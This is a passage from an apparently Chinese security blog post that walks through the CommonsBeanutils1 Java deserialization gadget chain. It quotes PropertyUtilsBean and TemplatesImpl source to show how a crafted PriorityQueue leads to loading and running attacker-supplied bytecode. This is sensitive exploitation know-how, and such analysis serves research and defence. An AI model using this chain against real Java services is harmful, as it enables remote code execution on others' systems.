-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> PropertyUtilsBean.<span style=color:#a6e22e>getInstance</span>().<span style=color:#a6e22e>getProperty</span>(bean, name);
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>getProperty</span>(Object bean, String name) <span style=color:#66d9ef>throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>getNestedProperty</span>(bean, name);
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>getNestedProperty</span>(Object bean, String name) <span style=color:#66d9ef>throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (bean <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException(<span style=color:#e6db74>&#34;No bean specified&#34;</span>);
-</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (name <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException(<span style=color:#e6db74>&#34;No name specified for bean class &#39;&#34;</span> <span style=color:#f92672>+</span> bean.<span style=color:#a6e22e>getClass</span>() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;&#34;</span>);
-</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>while</span>(<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>resolver</span>.<span style=color:#a6e22e>hasNested</span>(name)) {
-</span></span><span style=display:flex><span>                String next <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>resolver</span>.<span style=color:#a6e22e>next</span>(name);
-</span></span><span style=display:flex><span>                Object nestedBean <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (bean <span style=color:#66d9ef>instanceof</span> Map) {
-</span></span><span style=display:flex><span>                    nestedBean <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>getPropertyOfMapBean</span>((Map)bean, next);
-</span></span><span style=display:flex><span>                } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>resolver</span>.<span style=color:#a6e22e>isMapped</span>(next)) {
-</span></span><span style=display:flex><span>                    nestedBean <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>getMappedProperty</span>(bean, next);
-</span></span><span style=display:flex><span>                } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>resolver</span>.<span style=color:#a6e22e>isIndexed</span>(next)) {
-</span></span><span style=display:flex><span>                    nestedBean <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>getIndexedProperty</span>(bean, next);
-</span></span><span style=display:flex><span>                } <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>                    nestedBean <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>getSimpleProperty</span>(bean, next);
-</span></span><span style=display:flex><span>                }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (nestedBean <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
-</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> NestedNullException(<span style=color:#e6db74>&#34;Null property value for &#39;&#34;</span> <span style=color:#f92672>+</span> name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; on bean class &#39;&#34;</span> <span style=color:#f92672>+</span> bean.<span style=color:#a6e22e>getClass</span>() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;&#34;</span>);
-</span></span><span style=display:flex><span>                }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>                bean <span style=color:#f92672>=</span> nestedBean;
-</span></span><span style=display:flex><span>                name <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>resolver</span>.<span style=color:#a6e22e>remove</span>(name);
-</span></span><span style=display:flex><span>            }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (bean <span style=color:#66d9ef>instanceof</span> Map) {
-</span></span><span style=display:flex><span>                bean <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>getPropertyOfMapBean</span>((Map)bean, name);
-</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>resolver</span>.<span style=color:#a6e22e>isMapped</span>(name)) {
-</span></span><span style=display:flex><span>                bean <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>getMappedProperty</span>(bean, name);
-</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>resolver</span>.<span style=color:#a6e22e>isIndexed</span>(name)) {
-</span></span><span style=display:flex><span>                bean <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>getIndexedProperty</span>(bean, name);
-</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>                bean <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>getSimpleProperty</span>(bean, name);
-</span></span><span style=display:flex><span>            }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> bean;
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>    }
-</span></span></code></pre></div><p>在<code>getSimpleProperty</code>方法内会通过反射获取到<code>TemplatesImpl</code>对象<code>property</code>对应的的getter方法并调用，在java规范中outputProperities对应的getter方法名应该为getOutputProperities</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>    <span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>getSimpleProperty</span>(Object bean, String name) <span style=color:#66d9ef>throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (bean <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException(<span style=color:#e6db74>&#34;No bean specified&#34;</span>);
-</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (name <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException(<span style=color:#e6db74>&#34;No name specified for bean class &#39;&#34;</span> <span style=color:#f92672>+</span> bean.<span style=color:#a6e22e>getClass</span>() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;&#34;</span>);
-</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>resolver</span>.<span style=color:#a6e22e>hasNested</span>(name)) {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException(<span style=color:#e6db74>&#34;Nested property names are not allowed: Property &#39;&#34;</span> <span style=color:#f92672>+</span> name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; on bean class &#39;&#34;</span> <span style=color:#f92672>+</span> bean.<span style=color:#a6e22e>getClass</span>() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;&#34;</span>);
-</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>resolver</span>.<span style=color:#a6e22e>isIndexed</span>(name)) {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException(<span style=color:#e6db74>&#34;Indexed property names are not allowed: Property &#39;&#34;</span> <span style=color:#f92672>+</span> name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; on bean class &#39;&#34;</span> <span style=color:#f92672>+</span> bean.<span style=color:#a6e22e>getClass</span>() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;&#34;</span>);
-</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>resolver</span>.<span style=color:#a6e22e>isMapped</span>(name)) {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException(<span style=color:#e6db74>&#34;Mapped property names are not allowed: Property &#39;&#34;</span> <span style=color:#f92672>+</span> name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; on bean class &#39;&#34;</span> <span style=color:#f92672>+</span> bean.<span style=color:#a6e22e>getClass</span>() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;&#34;</span>);
-</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (bean <span style=color:#66d9ef>instanceof</span> DynaBean) {
-</span></span><span style=display:flex><span>            DynaProperty descriptor <span style=color:#f92672>=</span> ((DynaBean)bean).<span style=color:#a6e22e>getDynaClass</span>().<span style=color:#a6e22e>getDynaProperty</span>(name);
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (descriptor <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> NoSuchMethodException(<span style=color:#e6db74>&#34;Unknown property &#39;&#34;</span> <span style=color:#f92672>+</span> name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; on dynaclass &#39;&#34;</span> <span style=color:#f92672>+</span> ((DynaBean)bean).<span style=color:#a6e22e>getDynaClass</span>() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;&#34;</span>);
-</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> ((DynaBean)bean).<span style=color:#a6e22e>get</span>(name);
-</span></span><span style=display:flex><span>            }
-</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>            PropertyDescriptor descriptor <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>getPropertyDescriptor</span>(bean, name);
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (descriptor <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> NoSuchMethodException(<span style=color:#e6db74>&#34;Unknown property &#39;&#34;</span> <span style=color:#f92672>+</span> name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; on class &#39;&#34;</span> <span style=color:#f92672>+</span> bean.<span style=color:#a6e22e>getClass</span>() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;&#34;</span>);
-</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>                Method readMethod <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>getReadMethod</span>(bean.<span style=color:#a6e22e>getClass</span>(), descriptor);
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (readMethod <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
-</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> NoSuchMethodException(<span style=color:#e6db74>&#34;Property &#39;&#34;</span> <span style=color:#f92672>+</span> name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; has no getter method in class &#39;&#34;</span> <span style=color:#f92672>+</span> bean.<span style=color:#a6e22e>getClass</span>() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;&#34;</span>);
-</span></span><span style=display:flex><span>                } <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>                    Object value <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>invokeMethod</span>(readMethod, bean, EMPTY_OBJECT_ARRAY);
-</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span> value;
-</span></span><span style=display:flex><span>                }
-</span></span><span style=display:flex><span>            }
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>    }
-</span></span></code></pre></div><p><img alt src=/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/5.png></p><p><code>TemplatesImpl</code>类中<code>getOutputProperties</code>方法代码如下，会调用<code>newTransformer</code>方法</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>synchronized</span> Properties <span style=color:#a6e22e>getOutputProperties</span>() {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> newTransformer().<span style=color:#a6e22e>getOutputProperties</span>();
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>catch</span> (TransformerConfigurationException e) {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>synchronized</span> Transformer <span style=color:#a6e22e>newTransformer</span>()
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throws</span> TransformerConfigurationException
-</span></span><span style=display:flex><span>    {
-</span></span><span style=display:flex><span>        TransformerImpl transformer;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        transformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TransformerImpl(getTransletInstance(), _outputProperties,
-</span></span><span style=display:flex><span>            _indentNumber, _tfactory);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (_uriResolver <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
-</span></span><span style=display:flex><span>            transformer.<span style=color:#a6e22e>setURIResolver</span>(_uriResolver);
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (_tfactory.<span style=color:#a6e22e>getFeature</span>(XMLConstants.<span style=color:#a6e22e>FEATURE_SECURE_PROCESSING</span>)) {
-</span></span><span style=display:flex><span>            transformer.<span style=color:#a6e22e>setSecureProcessing</span>(<span style=color:#66d9ef>true</span>);
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> transformer;
-</span></span><span style=display:flex><span>    }
-</span></span></code></pre></div><p>newTransformer会调用getTransletInstance方法，在该方法内会调用defineTransletClasses方法，defineTransletClasses会读取_bytecodes并通过defineClass方法通过字节码加载成对应的类并构造对应的对象，所以这个过程会执行恶意类的构造方法。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>    <span style=color:#66d9ef>private</span> Translet <span style=color:#a6e22e>getTransletInstance</span>()
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throws</span> TransformerConfigurationException {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (_name <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (_class <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) defineTransletClasses();
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>            <span style=color:#75715e>// The translet needs to keep a reference to all its auxiliary</span>
-</span></span><span style=display:flex><span>            <span style=color:#75715e>// class to prevent the GC from collecting them</span>
-</span></span><span style=display:flex><span>            AbstractTranslet translet <span style=color:#f92672>=</span> (AbstractTranslet) _class<span style=color:#f92672>[</span>_transletIndex<span style=color:#f92672>]</span>.<span style=color:#a6e22e>newInstance</span>();
-</span></span><span style=display:flex><span>            translet.<span style=color:#a6e22e>postInitialization</span>();
-</span></span><span style=display:flex><span>            translet.<span style=color:#a6e22e>setTemplates</span>(<span style=color:#66d9ef>this</span>);
-</span></span><span style=display:flex><span>            translet.<span style=color:#a6e22e>setOverrideDefaultParser</span>(_overrideDefaultParser);
-</span></span><span style=display:flex><span>            translet.<span style=color:#a6e22e>setAllowedProtocols</span>(_accessExternalStylesheet);
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (_auxClasses <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
-</span></span><span style=display:flex><span>                translet.<span style=color:#a6e22e>setAuxiliaryClasses</span>(_auxClasses);
-</span></span><span style=display:flex><span>            }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> translet;
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>catch</span> (InstantiationException e) {
-</span></span><span style=display:flex><span>            ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg(ErrorMsg.<span style=color:#a6e22e>TRANSLET_OBJECT_ERR</span>, _name);
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException(err.<span style=color:#a6e22e>toString</span>());
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>catch</span> (IllegalAccessException e) {
-</span></span><span style=display:flex><span>            ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg(ErrorMsg.<span style=color:#a6e22e>TRANSLET_OBJECT_ERR</span>, _name);
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException(err.<span style=color:#a6e22e>toString</span>());
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>defineTransletClasses</span>()
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throws</span> TransformerConfigurationException {
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (_bytecodes <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
-</span></span><span style=display:flex><span>            ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg(ErrorMsg.<span style=color:#a6e22e>NO_TRANSLET_CLASS_ERR</span>);
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException(err.<span style=color:#a6e22e>toString</span>());
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        TransletClassLoader loader <span style=color:#f92672>=</span> (TransletClassLoader)
-</span></span><span style=display:flex><span>            AccessController.<span style=color:#a6e22e>doPrivileged</span>(<span style=color:#66d9ef>new</span> PrivilegedAction() {
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>run</span>() {
-</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> TransletClassLoader(ObjectFactory.<span style=color:#a6e22e>findClassLoader</span>(),_tfactory.<span style=color:#a6e22e>getExternalExtensionsMap</span>());
-</span></span><span style=display:flex><span>                }
-</span></span><span style=display:flex><span>            });
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>int</span> classCount <span style=color:#f92672>=</span> _bytecodes.<span style=color:#a6e22e>length</span>;
-</span></span><span style=display:flex><span>            _class <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>classCount<span style=color:#f92672>]</span>;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (classCount <span style=color:#f92672>&gt;</span> 1) {
-</span></span><span style=display:flex><span>                _auxClasses <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
-</span></span><span style=display:flex><span>            }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> 0; i <span style=color:#f92672>&lt;</span> classCount; i<span style=color:#f92672>++</span>) {
-</span></span><span style=display:flex><span>                _class<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> loader.<span style=color:#a6e22e>defineClass</span>(_bytecodes<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span>);
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>final</span> Class superClass <span style=color:#f92672>=</span> _class<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span>.<span style=color:#a6e22e>getSuperclass</span>();
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>                <span style=color:#75715e>// Check if this is the main class</span>
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (superClass.<span style=color:#a6e22e>getName</span>().<span style=color:#a6e22e>equals</span>(ABSTRACT_TRANSLET)) {
-</span></span><span style=display:flex><span>                    _transletIndex <span style=color:#f92672>=</span> i;
-</span></span><span style=display:flex><span>                }
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>                    _auxClasses.<span style=color:#a6e22e>put</span>(_class<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span>.<span style=color:#a6e22e>getName</span>(), _class<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span>);
-</span></span><span style=display:flex><span>                }
-</span></span><span style=display:flex><span>            }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (_transletIndex <span style=color:#f92672>&lt;</span> 0) {
-</span></span><span style=display:flex><span>                ErrorMsg err<span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg(ErrorMsg.<span style=color:#a6e22e>NO_MAIN_TRANSLET_ERR</span>, _name);
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException(err.<span style=color:#a6e22e>toString</span>());
-</span></span><span style=display:flex><span>            }
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>catch</span> (ClassFormatError e) {
-</span></span><span style=display:flex><span>            ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg(ErrorMsg.<span style=color:#a6e22e>TRANSLET_CLASS_ERR</span>, _name);
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException(err.<span style=color:#a6e22e>toString</span>());
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>catch</span> (LinkageError e) {
-</span></span><span style=display:flex><span>            ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg(ErrorMsg.<span style=color:#a6e22e>TRANSLET_OBJECT_ERR</span>, _name);
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException(err.<span style=color:#a6e22e>toString</span>());
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>    }
-</span></span></code></pre></div><p>所以可以总结:<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>的<code>_bytecodes</code>属性可以包含类的字节码，通过<code>newTransformer</code>方法可以调用字节码对应类的构造函数或者静态函数。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>TemplatesImpl</span> <span style=color:#66d9ef>implements</span> Templates, Serializable {
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>long</span> serialVersionUID <span style=color:#f92672>=</span> 673094361519270707L;
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>static</span> String DESERIALIZE_TRANSLET <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;jdk.xml.enableTemplatesImplDeserialization&#34;</span>;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#75715e>/**
-</span></span></span><span style=display:flex><span><span style=color:#75715e>     * Name of the superclass of all translets. This is needed to     * determine which, among all classes comprising a translet,     * is the main one.     */</span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> String ABSTRACT_TRANSLET
-</span></span><span style=display:flex><span>        <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span>;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#75715e>/**
-</span></span></span><span style=display:flex><span><span style=color:#75715e>     * Name of the main class or default name if unknown.     */</span>    <span style=color:#66d9ef>private</span> String _name <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#75715e>/**
-</span></span></span><span style=display:flex><span><span style=color:#75715e>     * Contains the actual class definition for the translet class and     * any auxiliary classes.     */</span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]</span> _bytecodes <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
-</span></span></code></pre></div><p>总结一下过程：PriorityQueue对象在反序列化过程中会触发排序，调用comparator.compare，在BeanComparator.compare方法中会尝试获取类的property对应的成员的值，其方法是通过尝试获取成员值对应的getter方法，而后调用这个getter方法。</p><p>而TemplatesImpl类的_bytecodes可以存储字节码并且可以通过newTransformer方法调用这个字节码对应类的构造函数或者静态方法，TemplatesImpl类的getOutputProperties方法会调用newTransformer方法。</p><p>而getOutputProperties在规范中对应于outputProperties的getter方法，最终构成反序列化链。</p><p><strong>参考链接</strong></p><blockquote><p><a href=https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html target=_blank>https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html</a></p></blockquote><p>创建于2024-01-11</p><p><strong>Created at 2024-01-12T14:32:08+08:00</strong></p><div class=last_mod>创建于:Friday, January 12,2024</div><div class=last_mod>最后修改于: Friday, January 12,2024</div><div class=article-container></div><script src=https://utteranc.es/client.js repo=CppXL/blog_comment issue-term=pathname theme=github-light crossorigin=anonymous async></script></div><div id=comments></div><footer class=footline></footer></div></div><div id=navigation><a class="nav nav-prev" href=/zh-cn/research/web/java-deserialization/ title="Java Deserialization"><i class="fa fa-chevron-left"></i></a>
